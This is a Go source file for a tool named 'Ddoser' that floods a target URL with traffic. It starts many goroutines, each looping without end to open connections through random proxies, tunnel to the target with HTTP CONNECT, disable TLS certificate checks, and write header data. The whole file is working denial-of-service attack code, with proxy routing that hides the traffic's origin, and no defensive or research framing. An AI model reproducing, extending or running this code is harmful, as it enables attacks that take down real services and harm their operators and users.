package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"time"

	"github.com/valyala/fasthttp"
)

type Ddoser struct {
	url        *url.URL
	numWorkers int
	headers    []string
	proxies    []string
}

func NewDdoser(u *url.URL, number int, headers, proxies []string) (*Ddoser, error) {
	return &Ddoser{
		url:        u,
		numWorkers: number,
		headers:    headers,
		proxies:    proxies,
	}, nil
}

func (d *Ddoser) Run() {
	for i := 0; i < d.numWorkers; i++ {
		addr := net.JoinHostPort(d.url.Hostname(), d.url.Port())
		go func() {
			var conn net.Conn
			var err error
			for {
				if conn, err = fasthttp.DialTimeout(random(d.proxies), time.Second*5); err != nil {
					continue
				}

				if d.url.Scheme == "https" {
					conn = tls.Client(conn, &tls.Config{
						ServerName:         d.url.Hostname(),
						InsecureSkipVerify: true,
					})
				}

				req := "CONNECT " + addr + " HTTP/1.1\r\n\r\n"

				if _, err = conn.Write([]byte(req)); err != nil {
					continue
				}

				if err = func() error {
					res := fasthttp.AcquireResponse()
					defer fasthttp.ReleaseResponse(res)

					res.SkipBody = true

					if err = res.Read(bufio.NewReader(conn)); err != nil {
						conn.Close()
						return err
					}

					if res.StatusCode() != 200 {
						conn.Close()
						return fmt.Errorf("%d", res.StatusCode())
					}

					return nil
				}(); err != nil {
					continue
				}

				for i := 0; i < len(d.headers); i++ {
					if _, err = conn.Write([]byte(d.headers[i])); err != nil {
						conn.Close()
						break
					}
				}
			}
		}()
	}
}
